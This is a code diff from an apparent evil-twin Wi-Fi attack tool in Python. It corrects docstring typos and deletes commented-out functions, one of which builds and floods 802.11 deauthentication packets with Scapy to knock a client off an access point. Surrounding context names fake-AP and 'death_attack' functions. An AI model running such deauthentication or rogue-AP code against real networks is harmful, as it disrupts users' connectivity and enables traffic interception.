@@ -40,7 +40,7 @@ def reset_interface() -> None:
 
 def print_msg(str, take_break: bool = True) -> None:
     """
-    This function make a nice print to the terminak
+    This function make a nice print to the terminal
     :param str: the msg we want to display
     :param take_break: indication if want to stop the process after the msg or not
     :return: None - Just print
@@ -67,7 +67,7 @@ def do_command(str, to_print: bool = True) -> None:
 
 def monitor_mode(interface: str) -> None:
     """
-    This function change the giveen interface mode to monitor
+    This function change the given interface mode to monitor
     :param interface:  string - represent the network adapter to configure
     :return: None
     """
@@ -105,32 +105,6 @@ def prepare_et_attack() -> None:
     print(f"Fake AP will use {ap_interface}")
 
 
-# def prepare_defence():
-#     """
-#
-#     :return:
-#     """
-#     global sniffer_interface
-#     global ap_interface
-#
-#     reset_interface()
-#
-#     # set one inerface to be monitor
-#     do_command('iwconfig')
-#     sniffer_interface = 'wlan0'
-#     user_input = input("Please type the interface name you want to put in 'monitor mode'\n"
-#                        "hit enter for 'wlan0'\n")
-#     if user_input != '':
-#         sniffer_interface = user_input
-#     monitor_mode(sniffer_interface)
-#
-#     # get interface to manage the fake AP
-#     do_command('iwconfig')
-#     ap_interface = 'wlan1'
-#     user_input = input("Please type the interface name you want to use for fake AP\n"
-#                        "hit enter for 'wlan1'\n")
-#     if user_input != '':
-#         ap_interface = user_input
 
 
 def managed_mode(interface):
@@ -393,36 +367,6 @@ def APs_scanner() -> int:
             print("#  Goodbye  #")
             return -1
 
-#
-# def attack(client_idx: int):
-#     """
-#     This function build a fake disconnect packet called 'death authentication'
-#     by 802.11 frame foramt and send to client and to AP
-#     # addr1: destination MAC
-#     # addr2: source MAC
-#     # addr3: Access Point MAC
-#     :param client_idx: index in client list
-#     """
-#     # global ap_to_attack
-#     print("attacking")
-#
-#     client_mac = client_list[client_idx]
-#     print("attacking client mac:", client_mac)
-#
-#     for y in range(1, 3):
-#         # sending fake packets  in two directions : AP -> client , client -> AP
-#         pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
-#         pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
-#         for _ in range(50):
-#             print("sending death packets...")
-#             sendp(pkt1, iface=sniffer_interface, count=20)
-#             sendp(pkt2, iface=sniffer_interface, count=20)
-#             if y % 30 == 0:
-#                 press = input("press p to stop, otherwise any")
-#                 if press == 'p':
-#                     print("#  Goodbye  #")
-#                     break
-#
 
 def death_attack(client_mac: str):
     """
